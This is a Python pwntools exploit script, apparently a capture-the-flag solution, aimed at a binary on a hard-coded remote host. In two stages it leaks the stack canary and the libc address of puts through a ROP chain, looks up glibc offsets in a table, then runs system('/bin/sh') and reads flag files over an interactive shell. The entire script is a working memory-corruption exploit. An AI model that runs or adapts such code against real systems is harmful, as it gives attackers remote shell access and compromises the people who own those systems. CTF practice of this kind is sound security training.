#!/usr/bin/env python3
"""Two-stage exploit: leak libc via ret2plt, then ret2libc."""
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

elf = ELF('./attachment-56', checksec=False)
HOST = '39.96.193.120'
PORT = 10001

OFFSET = 24
MARKER = b'A' * 25
POP_RDI = 0x401763
RET = 0x40101a
PUTS_PLT = elf.plt['puts']
PUTS_GOT = elf.got['puts']
MAIN = elf.sym['main']

r = remote(HOST, PORT)

# ==== Pass lock_one ====
r.sendlineafter(b"wizard's note:", b'100')
r.sendlineafter(b'rune sheet!', b'magic')

# ==== Stage 1: Leak canary + puts@libc ====
r.recvuntil(b'What do you sacrifice?\n')
r.send(MARKER)
leak = r.recvuntil(b'curious gift indeed.\n')
pos = leak.rfind(MARKER)
canary = u64(b'\x00' + leak[pos+len(MARKER):pos+len(MARKER)+7])
log.success(f'canary = {hex(canary)}')

rop1 = flat(POP_RDI, PUTS_GOT, PUTS_PLT, MAIN)
payload1 = flat({0: b'B'*OFFSET, 24: p64(canary), 32: b'C'*8, 40: rop1})
r.send(payload1)

r.recvuntil(b'warmth.\n')
puts_addr = u64(r.recvline().strip().ljust(8, b'\x00'))
log.success(f'puts@libc = {hex(puts_addr)}')

# ==== Identify libc ====
# Last 3 nibbles of puts identify the libc version
log.info(f'puts last 3 nibbles: {hex(puts_addr & 0xfff)}')

# Ubuntu 20.04 glibc 2.31 common variants
known = {
    # (puts_last12, puts_offset, system_offset, binsh_offset)
    0xed0: (0x80ed0, 0x52290, 0x1b45bd),
    0xe60: (0x80e60, 0x522c0, 0x1b45bd),
    0x5d0: (0x875d0, 0x55410, 0x1b75aa),
    0x5c0: (0x875c0, 0x55410, 0x1b75aa),
    0x5a0: (0x875a0, 0x55410, 0x1b75aa),
    0x560: (0x84560, 0x52290, 0x1b45bd),
}
last12 = puts_addr & 0xfff
if last12 in known:
    puts_off, sys_off, sh_off = known[last12]
else:
    log.warning(f'Unknown libc! puts_last12={hex(last12)}')
    # Try the most common offset as fallback
    puts_off = puts_addr & 0xfff  # use lower bits directly
    # Try to find the base by aligning
    for candidate in [0x875a0, 0x80ed0, 0x84560, 0x80e60]:
        if (puts_addr - candidate) & 0xfff == 0:
            puts_off = candidate
            break
    sys_off = 0x55410
    sh_off = 0x1b75aa
    
libc_base = puts_addr - puts_off
log.success(f'libc_base = {hex(libc_base)} (puts_off={hex(puts_off)})')

system = libc_base + sys_off
binsh  = libc_base + sh_off
log.success(f'system = {hex(system)}')
log.success(f'binsh  = {hex(binsh)}')

# ==== Stage 2: Shell ====
# Send null byte for first read so printf prints nothing useful
r.send(b'\x00')
r.recvuntil(b'curious gift indeed.\n')

rop2 = flat(RET, POP_RDI, binsh, system)
payload2 = flat({0: b'D'*OFFSET, 24: p64(canary), 32: b'E'*8, 40: rop2})
r.send(payload2)

sleep(0.3)
r.sendline(b'id')
r.sendline(b'cat /flag* 2>/dev/null; cat flag* 2>/dev/null; ls -la')

r.interactive()
